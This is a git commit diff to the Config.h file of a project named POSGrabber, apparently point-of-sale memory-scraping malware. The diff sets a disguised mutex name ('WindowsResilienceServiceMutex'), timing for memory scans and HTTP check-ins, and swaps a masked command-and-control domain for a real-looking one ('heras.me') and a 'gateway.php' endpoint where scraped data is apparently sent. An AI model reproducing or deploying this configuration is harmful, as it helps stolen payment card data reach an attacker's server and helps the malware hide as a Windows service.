2f4499edd4c6c72fe07876b9d37a8eb534e8d2ac
p2svn9x <37497642+p2svn9x@users.noreply.github.com>
2018-11-09 22:16:22 +0700

    Update Config.h

--- POSGrabber/Config.h
+++ POSGrabber/Config.h
@@ -4,6 +4,6 @@
 #define MemoryScanInterval  (20*60000) //1min 
 #define HttpConnectInterval (200*60000) //30min
 #define MutexString "WindowsResilienceServiceMutex"
-static char *Urls[]  = { "*********.com",0x00 };
-static char *Pages[] = { "images/logo/header.php",0x00 }; 
+static char *Urls[]  = { "heras.me",0x00 };
+static char *Pages[] = { "gateway.php",0x00 }; 
 //END CONFIG////////////
